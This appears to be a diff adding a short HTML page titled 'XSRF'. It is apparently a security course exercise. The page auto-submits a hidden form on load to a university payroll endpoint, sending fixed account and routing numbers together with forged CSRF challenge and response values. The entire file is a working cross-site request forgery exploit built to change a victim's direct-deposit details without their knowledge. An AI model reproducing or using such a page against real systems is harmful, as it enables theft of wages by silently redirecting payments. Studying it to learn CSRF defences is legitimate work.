@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+ <head>
+ <meta charset="UTF-8" />
+ <title>XSRF</title>
+ </head>
+ <body onload="document.forms[0].submit()">
+ <form method="post" onsubmit="" action="http://payroll.gatech.edu/account.php">
+       <label>Account number:</label>
+       <input id="account" name="account" value="1196037395" type="number">
+       <label>Routing number:</label>
+       <input id="route" name="routing" value="767502115" type="number">
+       <input id="csrfc" name="challenge" value="1161895542" type="hidden">
+       <input id="csrfr" name="response" value="154517" type="hidden">
+       <input id="action" name="action" value="save" type="hidden">
+       <div>
+        <button class="btn submit" name="action" value="save">Save</button>
+       </div>
+      </form>
+</body>
+</html>
